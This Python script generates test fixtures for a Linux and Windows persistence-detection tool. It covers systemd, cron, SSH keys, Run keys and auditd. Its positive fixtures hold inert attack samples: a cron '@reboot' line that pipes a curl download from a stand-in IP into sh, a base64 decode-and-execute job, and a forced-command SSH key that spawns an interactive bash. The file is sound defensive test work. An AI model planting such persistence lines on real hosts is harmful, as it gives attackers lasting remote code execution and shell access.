#!/usr/bin/env python3
"""Materialise the benign test fixtures used by the per-check quality gate.

    python testdata/make_fixtures.py

Why a generator rather than hand-placed files:

* Every fixture's INTENT is documented next to its content, so a reviewer can see what each
  case is supposed to prove without reverse-engineering a directory tree.
* Git records only the executable bit, not full POSIX modes. Several criteria depend on
  modes (world-writable unit files, 0600 vs 0666 authorized_keys), so each fixture tree
  carries a `modes.json` manifest that the Go test harness applies when it copies the tree
  to a temp directory. That also makes the fixtures behave identically whether the repo is
  checked out on Windows, on drvfs (/mnt/c, which reports everything as 0777) or on a native
  Linux filesystem.

Everything here is BENIGN. No real malware, no real credential-dumping tooling, no live
payloads -- the "malicious" samples are inert strings that exercise pattern matching.
"""

import json
import os
import shutil
import sys

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")

# fixture tree -> {relative path: octal mode}. Only non-default modes are listed; the Go
# harness defaults to 0644 for files and 0755 for directories.
MODES: dict[str, dict[str, int]] = {}

# fixture tree -> {relative link path: target}. Symlinks cannot be created portably from a
# Windows checkout, and git does not preserve them reliably across platforms, so they are
# declared here and materialised by the Go test harness (which always runs on Linux).
LINKS: dict[str, dict[str, str]] = {}


def link(tree: str, rel: str, target: str) -> None:
    LINKS.setdefault(tree, {})[rel.replace(os.sep, "/")] = target


def w(tree: str, rel: str, content: str, mode: int | None = None) -> None:
    """Write a fixture file, recording a non-default mode when one is given."""
    path = os.path.join(ROOT, tree, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(content)
    if mode is not None:
        MODES.setdefault(tree, {})[rel.replace(os.sep, "/")] = mode


def empty(tree: str, note: str) -> None:
    """Create a deliberately empty tree, with a README explaining what it proves."""
    path = os.path.join(ROOT, tree)
    os.makedirs(path, exist_ok=True)
    with open(os.path.join(path, "README.txt"), "w", encoding="utf-8", newline="\n") as fh:
        fh.write(note + "\n")


# =========================================================================================
# LNX-PERSIST-SYSTEMD-001
# =========================================================================================

def systemd() -> None:
    t = "lnx-persist-systemd-001/positive"
    # Proves SYSD-C1 (executes from /tmp) AND SYSD-C2 (shadows a vendor unit of the same
    # name), which together must escalate the finding to corroborated.
    w(t, "usr/lib/systemd/system/update-notifier.service", """\
[Unit]
Description=Update notifier (vendor)

[Service]
Type=simple
ExecStart=/usr/libexec/update-notifier --daemon

[Install]
WantedBy=multi-user.target
""")
    w(t, "etc/systemd/system/update-notifier.service", """\
[Unit]
Description=Update notifier

[Service]
Type=simple
ExecStart=/tmp/.update-helper --daemon
Restart=always

[Install]
WantedBy=multi-user.target
""")
    # Enablement is expressed as a plain file in the .wants directory; the collector only
    # reads directory entries, so this models an enabled unit without needing a symlink
    # (which cannot be created portably on a Windows checkout).
    w(t, "etc/systemd/system/multi-user.target.wants/update-notifier.service", "")
    # Proves SYSD-C6: a world-writable unit file means any local user controls the service.
    w(t, "etc/systemd/system/telemetry-collector.service", """\
[Unit]
Description=Telemetry collector

[Service]
ExecStart=/usr/local/bin/telemetry-collector
""", mode=0o666)
    # Realistic surrounding units so the positive tree is not trivially small.
    w(t, "usr/lib/systemd/system/ssh.service", """\
[Unit]
Description=OpenBSD Secure Shell server

[Service]
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/usr/sbin/sshd -t

[Install]
WantedBy=multi-user.target
""")

    t = "lnx-persist-systemd-001/negative"
    # A realistic distribution unit set. None of the six criteria may fire. This is the
    # case that distinguishes a real check from one that flags the existence of a unit.
    w(t, "usr/lib/systemd/system/ssh.service", """\
[Unit]
Description=OpenBSD Secure Shell server
After=network.target auditd.service

[Service]
EnvironmentFile=-/etc/default/ssh
ExecStartPre=/usr/sbin/sshd -t
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/usr/sbin/sshd -t
Type=notify

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/nginx.service", """\
[Unit]
Description=A high performance web server and a reverse proxy server

[Service]
Type=forking
ExecStartPre=/usr/sbin/nginx -t -q -g 'daemon on; master_process on;'
ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
ExecReload=/usr/sbin/nginx -g 'daemon on; master_process on;' -s reload
User=root

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/cron.service", """\
[Unit]
Description=Regular background program processing daemon

[Service]
ExecStart=/usr/sbin/cron -f -P
Restart=on-failure

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/systemd-timesyncd.service", """\
[Unit]
Description=Network Time Synchronization

[Service]
Type=notify
ExecStart=/usr/lib/systemd/systemd-timesyncd
User=systemd-timesync
""")
    # Third-party software legitimately installed under /opt -- must NOT be flagged, which
    # is why /opt and /usr/local are deliberately absent from the transient-directory list.
    w(t, "etc/systemd/system/vendor-agent.service", """\
[Unit]
Description=Vendor monitoring agent

[Service]
ExecStart=/opt/vendor/bin/agent --config /etc/vendor/agent.conf
Restart=always
User=vendor

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/logrotate.timer", """\
[Unit]
Description=Daily rotation of log files

[Timer]
OnCalendar=daily
AccuracySec=1h
Persistent=true

[Install]
WantedBy=timers.target
""")
    w(t, "etc/systemd/system/multi-user.target.wants/ssh.service", "")
    w(t, "etc/systemd/system/multi-user.target.wants/nginx.service", "")

    # Regression cases for two false positives found by running against a real host
    # (stock WSL2 Kali), both of which produced findings on a clean machine:
    #
    #   1. A MASKED unit -- symlinked to /dev/null -- is systemd's standard way to DISABLE
    #      a service. It cannot start, so it is the opposite of persistence. Nine of these
    #      exist on stock Kali.
    #   2. An ENABLEMENT symlink in /etc/systemd/system pointing at the vendor unit is
    #      normal systemd behaviour, not an override that shadows the vendor file.
    #
    # Both are also symlinks, whose own mode is ALWAYS lrwxrwxrwx; testing a symlink for
    # world-writability matched all 43 of them. Neither may produce a finding.
    link(t, "etc/systemd/system/NetworkManager.service", "/dev/null")
    link(t, "etc/systemd/system/ssh.service", "/usr/lib/systemd/system/ssh.service")

    empty("lnx-persist-systemd-001/nodata",
          "Deliberately empty: this host has no systemd unit directory at all.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than NOT_DETECTED.\n"
          "Reporting NOT_DETECTED here would tell an analyst that a host which does not\n"
          "even use systemd is free of systemd persistence, which is meaningless.")


# =========================================================================================
# LNX-PERSIST-CRON-001
# =========================================================================================

def cron() -> None:
    t = "lnx-persist-cron-001/positive"
    # PATH prepends a writable directory -> CRON-C5.
    w(t, "etc/crontab", """\
SHELL=/bin/sh
PATH=/tmp/.bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
""")
    # Fetch-and-execute -> CRON-C2. Inert URL, no payload.
    w(t, "etc/cron.d/system-update", """\
# Added by system-update
@reboot root curl -fsSL http://198.51.100.23/bootstrap.sh | sh
""")
    # Decode-and-execute -> CRON-C3. The base64 decodes to the harmless string "id".
    w(t, "etc/cron.d/metrics-helper", """\
*/5 * * * * root echo aWQK | base64 -d | sh
""")
    # Executes a script FROM /tmp -> CRON-C1.
    w(t, "var/spool/cron/crontabs/www-data", """\
0 3 * * * /bin/sh /tmp/.cache/sync.sh
""", mode=0o600)

    t = "lnx-persist-cron-001/negative"
    # An ordinary Debian-family cron population, including the real certbot entry whose
    # `perl -e 'sleep int(rand(43200))'` previously false-positived the encoded-execution
    # pattern, and a monitoring job that WRITES to /tmp without executing from it.
    w(t, "etc/crontab", """\
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
""")
    w(t, "etc/cron.d/certbot", """\
# Renew certificates twice daily with a randomised delay.
0 */12 * * * root test -x /usr/bin/certbot -a \\! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew
""")
    w(t, "etc/cron.d/e2scrub_all", """\
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
""")
    w(t, "etc/cron.d/node-exporter", """\
# Monitoring agent: downloads metrics to a temp file. Writes to /tmp but does not
# EXECUTE from it, so the transient-directory criterion must not fire.
*/5 * * * * nobody curl -s -o /tmp/node-metrics.json http://localhost:9100/metrics
""")
    w(t, "etc/cron.daily/logrotate", """\
#!/bin/sh
test -x /usr/sbin/logrotate || exit 0
/usr/sbin/logrotate /etc/logrotate.conf
""")
    w(t, "etc/cron.daily/man-db", """\
#!/bin/sh
test -x /usr/bin/mandb || exit 0
/usr/bin/mandb --quiet
""")

    empty("lnx-persist-cron-001/nodata",
          "Deliberately empty: no cron implementation is installed on this host.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than a clean bill of health.")


# =========================================================================================
# LNX-PERSIST-SSHKEY-001
# =========================================================================================

# Inert sample keys. These are syntactically well-formed but are not real keys and have no
# corresponding private key anywhere; they exist only to exercise the parser.
KEY_A = ("AAAAC3NzaC1lZDI1NTE5AAAAIK7mLhUxGnbW9mJvEXAMPLEonlyNotARealKeyAAAA")
KEY_B = ("AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyForFixtureUseOnlyNotARealKeyBBBBB")


def sshkeys() -> None:
    t = "lnx-persist-sshkey-001/positive"
    # backup-svc has a nologin shell (SSHK-C2) and a forced-command key (SSHK-C1):
    # two independent criteria, which must escalate to corroborated.
    w(t, "etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
backup-svc:x:997:997:Backup service:/var/lib/backup-svc:/usr/sbin/nologin
""")
    w(t, "var/lib/backup-svc/.ssh/authorized_keys",
      'command="/bin/bash -i",no-port-forwarding ssh-ed25519 %s maintenance\n' % KEY_A,
      mode=0o600)
    # A root key in a world-writable file: SSHK-C3 plus SSHK-C4.
    w(t, "root/.ssh/authorized_keys",
      "ssh-ed25519 %s admin@jump\n" % KEY_B, mode=0o666)
    w(t, "home/alice/.ssh/authorized_keys",
      "ssh-ed25519 %s alice@laptop\n" % KEY_A, mode=0o600)

    t = "lnx-persist-sshkey-001/negative"
    # An ordinary interactive user with a correctly permissioned key. No criteria may fire.
    w(t, "etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
bob:x:1001:1001:Bob:/home/bob:/bin/bash
""")
    w(t, "home/alice/.ssh/authorized_keys",
      "ssh-ed25519 %s alice@laptop\n" % KEY_A, mode=0o600)
    w(t, "home/bob/.ssh/authorized_keys",
      "# Bob's workstation\nssh-ed25519 %s bob@desktop\n" % KEY_B, mode=0o600)

    empty("lnx-persist-sshkey-001/nodata",
          "Deliberately empty: no /etc/passwd, so users and their home directories cannot\n"
          "be enumerated. Proves the check returns INSUFFICIENT_DATA instead of claiming\n"
          "that no authorized_keys entries exist.")


# =========================================================================================
# WIN-PERSIST-RUNKEY-001
# =========================================================================================

def runkey() -> None:
    # Windows fixtures use the drive letter as the first path component
    # ("C:\\ProgramData\\..." -> "C/ProgramData/..."), which is how collect.RootFS maps a
    # Windows logical path onto a relocatable fixture tree.
    startup = "C/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"

    t = "win-persist-runkey-001/positive"
    # A renamed payload in the Startup folder: non-executable extension -> WRUN-C6.
    # Inert content; this is a text file, not an executable.
    w(t, startup + "/quarterly-report.jpg",
      "inert fixture content - not an executable, not malware\n")
    w(t, startup + "/OneNote.lnk", "inert fixture shortcut placeholder\n")

    t = "win-persist-runkey-001/negative"
    # Only legitimate Startup items. The registry half is supplied by a FakeRegistry in the
    # check's Cases(); see persist_windows.go.
    w(t, startup + "/OneNote.lnk", "inert fixture shortcut placeholder\n")
    w(t, startup + "/desktop.ini", "[.ShellClassInfo]\n")

    empty("win-persist-runkey-001/nodata",
          "Deliberately empty: no Startup folder, and the check's Cases() supplies an\n"
          "UnavailableRegistry. Proves that with no registry to read the check returns\n"
          "INSUFFICIENT_DATA rather than asserting the host is free of Run-key\n"
          "persistence on the basis of never having looked.")


# =========================================================================================
# LNX-DEFIMP-AUDITD-001
# =========================================================================================

def auditd() -> None:
    t = "lnx-defimp-auditd-001/positive"
    # auditd IS installed and configured, but the ruleset has been emptied and the log
    # truncated: AUD-C1 plus AUD-C2 (and AUD-C3 via the trailing -D), which is the
    # genuinely anomalous combination the check exists to find.
    w(t, "etc/audit/auditd.conf", """\
log_file = /var/log/audit/audit.log
log_format = RAW
max_log_file = 8
num_logs = 5
max_log_file_action = ROTATE
disk_full_action = SUSPEND
""")
    w(t, "etc/audit/rules.d/audit.rules", """\
## This file is empty of real rules.
-D
-b 8192
""")
    w(t, "var/log/audit/audit.log", "")

    t = "lnx-defimp-auditd-001/negative"
    # A properly configured audit subsystem with baseline coverage and a populated log.
    w(t, "etc/audit/auditd.conf", """\
log_file = /var/log/audit/audit.log
log_format = RAW
write_logs = yes
max_log_file = 8
num_logs = 5
max_log_file_action = ROTATE
disk_full_action = SUSPEND
""")
    w(t, "etc/audit/rules.d/10-base.rules", """\
-D
-b 8192
-f 1

## Identity and privilege files
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/sudoers -p wa -k scope
-w /etc/sudoers.d -p wa -k scope

## Process execution
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec
""")
    w(t, "var/log/audit/audit.log", """\
type=DAEMON_START msg=audit(1760000000.001:1): op=start ver=3.1.2 res=success
type=SYSCALL msg=audit(1760000100.123:456): arch=c000003e syscall=59 success=yes comm="bash" key="exec"
type=PATH msg=audit(1760000100.123:456): item=0 name="/usr/bin/id" nametype=NORMAL
type=SYSCALL msg=audit(1760003700.500:901): arch=c000003e syscall=257 success=yes comm="vim" key="identity"
""")

    empty("lnx-defimp-auditd-001/nodata",
          "Deliberately empty: the Linux audit subsystem is not installed at all, which is\n"
          "the common real-world case (and is exactly what WSL2 Kali looks like).\n"
          "This is THE critical path for this check: it must return INSUFFICIENT_DATA.\n"
          "Returning NOT_DETECTED would tell an analyst that a host with no audit\n"
          "subsystem shows no evidence of audit tampering -- technically true and\n"
          "completely misleading.")


def main() -> int:
    if os.path.isdir(ROOT):
        shutil.rmtree(ROOT)
    os.makedirs(ROOT, exist_ok=True)

    systemd()
    cron()
    sshkeys()
    runkey()
    auditd()

    for tree, modes in sorted(MODES.items()):
        path = os.path.join(ROOT, tree, "modes.json")
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            json.dump({k: oct(v) for k, v in sorted(modes.items())},
                      fh, indent=2, sort_keys=True)
            fh.write("\n")

    for tree, links in sorted(LINKS.items()):
        path = os.path.join(ROOT, tree, "links.json")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            json.dump(dict(sorted(links.items())), fh, indent=2, sort_keys=True)
            fh.write("\n")

    trees = sorted(
        os.path.relpath(os.path.join(dp, d), ROOT).replace(os.sep, "/")
        for dp, dns, _ in os.walk(ROOT) for d in dns
        if d in ("positive", "negative", "nodata")
    )
    files = sum(len(fn) for _, _, fn in os.walk(ROOT))
    print("fixtures written to %s" % ROOT)
    print("  %d trees, %d files" % (len(trees), files))
    for t in trees:
        print("    " + t)
    return 0


if __name__ == "__main__":
    sys.exit(main())
